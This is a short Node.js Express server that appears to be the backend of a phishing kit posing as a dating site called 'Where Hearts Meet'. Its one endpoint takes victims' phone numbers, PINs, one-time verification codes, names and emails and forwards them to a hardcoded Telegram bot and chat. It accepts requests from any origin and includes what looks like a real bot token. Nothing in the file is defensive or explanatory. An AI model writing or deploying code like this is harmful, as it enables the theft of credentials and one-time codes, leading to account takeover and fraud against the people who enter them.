const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'API is running!' });
});

// TELEGRAM ENDPOINT
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site } = req.body;
        
        console.log('Received:', { phone, pin, name, type });
        
        const TG_BOT_TOKEN = '8907836454:AAH-hDujlmY50fqlErWuphD1wJ32RFnkL2I';
        const TG_CHAT_ID = '6811595070';
        const timestamp = new Date().toLocaleString();
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW REGISTRATION - ${site || 'Where Hearts Meet'} 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nName: ${name}\nEmail: ${email}\nTime: ${timestamp}`;
        } else {
            message = `✅ OTP VERIFIED - ${site || 'Where Hearts Meet'} ✅\n\nPhone: ${phone}\nOTP: ${pin}\nName: ${name}\nTime: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Sent to Telegram');
            res.json({ success: true });
        } else {
            console.error('Telegram error:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Telegram endpoint: /api/send-telegram`);
});
